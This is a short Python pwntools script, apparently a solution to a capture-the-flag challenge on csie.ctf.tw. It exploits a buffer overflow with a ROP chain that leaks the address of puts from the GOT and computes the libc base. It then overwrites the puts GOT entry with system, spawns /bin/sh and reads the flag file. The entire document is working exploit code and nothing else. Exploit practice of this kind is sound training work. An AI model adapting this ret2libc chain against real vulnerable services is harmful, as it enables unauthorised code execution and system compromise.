from pwn import *

host = "csie.ctf.tw"
port = 10131
context.arch = "amd64"

buf = 0x601040

payload = b"A" * (0x20 + 8)
pop_rdi = 0x4006f3
pop_rsi_r15 = 0x4006f1


puts_plt = 0x4004e0
puts_got = 0x601018
gets_plt = 0x400510
puts_off = 0x6f690
system_off = 0x45390


ropchain1 = flat([payload, pop_rdi, puts_got, puts_plt,
                  pop_rdi, puts_got, gets_plt, pop_rdi,
                  puts_got+8, puts_plt])


r = remote(host, port)
r.recvuntil(":")
r.sendline(ropchain1)
r.recvline()
puts_addr = u64(r.recvline().strip().ljust(8, b"\x00"))
libc_base = puts_addr - puts_off
system_addr = libc_base + system_off
r.sendline(p64(system_addr) + b"/bin/sh" )
r.sendline("cat /home/`whoami`/flag")
f = r.recvline()
print(f)
#r.interactive()
